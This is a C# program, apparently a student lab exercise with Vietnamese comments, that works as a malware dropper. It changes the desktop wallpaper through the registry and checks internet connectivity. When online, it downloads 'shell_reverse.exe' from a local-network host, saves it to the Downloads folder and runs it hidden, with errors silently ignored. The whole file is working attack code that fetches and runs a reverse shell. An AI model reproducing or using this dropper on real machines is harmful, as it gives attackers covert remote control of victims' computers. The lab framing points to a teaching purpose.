using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace LAB1_Bai1._3
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
        static void Main(string[] args)
        {
            Change_Wallpaper();
            bool result = Check_Connection();
            if (result == true)
            {
                Create_Reverse_Shell();
            }
            else
            {
                Create_Directory();
            }
        }

        
        static void Change_Wallpaper()
        {
            //lấy đường dẫn hình nền mới
            string path =@"S:\Picture.jpg";
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());
            //thay đổi hình nền
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        static bool Check_Connection()
        {
            // xác định uri trang web cần truy cập
            string url = @"http://www.google.com";

            // nếu thuận lợi truy cập web thành công -> trả về true
            // nếu không thể truy cập trang web (web server chắc chắn alive), xảy ra exception -> trả về false
            try
            {
                // dùng using để dọn dẹp đôi tượng khởi tạo dù có xảy ra exception
                using (WebClient wb = new WebClient())
                // thực hiện kết nối - đọc resource của web page từ url chỉ định
                using (wb.OpenRead(url))
                    return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        static void Create_Reverse_Shell()
        {
            //tạo 1 webclient để dowload và lưu trữ reverse shell
            try
            {
                if (!File.Exists(@"C:\Users\Admin\Downloads\shell_reverse.exe"))
                {
                    //tạo 1 webclient để dowload và lưu trữ reverse shell
                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("http://192.168.221.128/shell_reverse.exe", @"C:\Users\Admin\Downloads\shell_reverse.exe");
                }
            }
            catch (Exception)
            {
                //
            }
            //tiến hành chạy reverse shell đó

            Process prcs = new Process();

            prcs.StartInfo.FileName = @"C:\Users\Admin\Downloads\shell_reverse.exe";
            // Chạy tiến trình ngầm, không hiển thị của sổ
            prcs.StartInfo.CreateNoWindow = true;

            try
            {
                // Chạy tiến trình
                prcs.Start();
            }
            catch (Exception)
            {
                //
            }

            //System.Diagnostics.Process process = new System.Diagnostics.Process();
            //System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            //startInfo.FileName = "cmd.exe";
            //startInfo.Arguments = @"C:\Users\Admin\Downloads\shell_reverse.exe";
            //process.StartInfo = startInfo;
            //process.Start();

        }
        static void Create_Directory()
        {
            // Tạo folder với tên Hacking
            string folderName = @"C:\Users\Admin\Desktop\Hacking";
            if (!Directory.Exists(folderName))
            {
                Directory.CreateDirectory(folderName);
            }
        }
    }
}
